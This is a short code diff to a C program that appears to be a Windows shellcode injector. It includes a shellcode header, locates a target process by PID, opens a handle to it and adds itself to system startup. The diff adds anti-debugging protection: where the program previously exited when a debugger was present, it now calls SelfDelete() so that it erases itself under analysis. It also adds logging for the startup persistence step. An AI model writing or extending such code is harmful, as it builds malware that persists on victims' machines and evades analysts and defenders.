@@ -6,6 +6,7 @@
 #include "find_pid.h"
 #include "shellcode.h"
 #include <stdbool.h>
+#include "DebugProtection.h"
 //#include "dll_inj.h"
 
 const char* k = "[+]";
@@ -26,11 +27,13 @@ int main(int arcg,char* argv[]) {
 	if (oDebug)
 	{
 
-		if (IsDebuggerPresent()) {
-
-			printf("%s the program is debugged ", e);
-			return EXIT_FAILURE;
+		if (IsDebuggerPresent()){
+			
+			SelfDelete();
+			
+		
 		}
+
 
 		LARGE_INTEGER StartingTime, EndingTime, ElapsedMicroseconds;
 		LARGE_INTEGER Frequency;
@@ -63,6 +66,7 @@ int main(int arcg,char* argv[]) {
 
 
 		AddToStartup();
+		printf("%s add to startup \n",k);
 
 		printf("%s trying to open handle to process (%ld)\n", i, PID);
 
@@ -113,7 +117,9 @@ int main(int arcg,char* argv[]) {
 	{
 
 		if (IsDebuggerPresent()) {
-			return EXIT_FAILURE;
+
+			SelfDelete();
+
 		}
 
 
